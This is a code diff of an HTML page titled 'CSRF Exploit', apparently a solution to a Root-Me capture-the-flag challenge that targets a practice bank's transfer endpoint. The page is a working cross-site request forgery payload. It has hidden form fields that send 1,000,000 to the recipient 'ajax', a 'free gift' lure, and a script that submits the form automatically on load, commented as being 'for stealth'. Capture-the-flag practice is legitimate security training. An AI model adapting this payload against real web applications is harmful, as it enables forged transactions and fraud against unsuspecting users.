@@ -3,21 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
+    <title>CSRF Exploit</title>
 </head>
 <body>
-    <form action="https://bankme-1.challenges.pro.root-me.org/transfer/" method="post">
+    <h1>Special Offer! Click Below</h1>
+    <p>Claim your free gift now!</p>
+    <form action="https://bankme-1.challenges.pro.root-me.org/transfer/" method="POST">
         <input type="hidden" name="recipient" value="ajax">
-        <input type="hidden" name="amount" value="1000000" />
-        <button type="submit">Petit cadeau de la banque pour vous</button>
-     </form>
-     <script>
-        // Lorsque la page est chargée, soumettre automatiquement le formulaire
-        window.onload = function() {
-            setTimeout(function() {
-                document.forms[0].submit(); // Soumettre le premier formulaire
-            }, 1000); // Délai de 1 seconde pour être sûr que les cookies sont envoyés
-        };
-     </script>
+        <input type="hidden" name="amount" value="1000000">
+        <button type="submit">Claim Your Gift!</button>
+    </form>
+    <!-- Optionally, auto-submit the form for stealth -->
+    <script>
+        document.forms[0].submit();
+    </script>
 </body>
 </html>
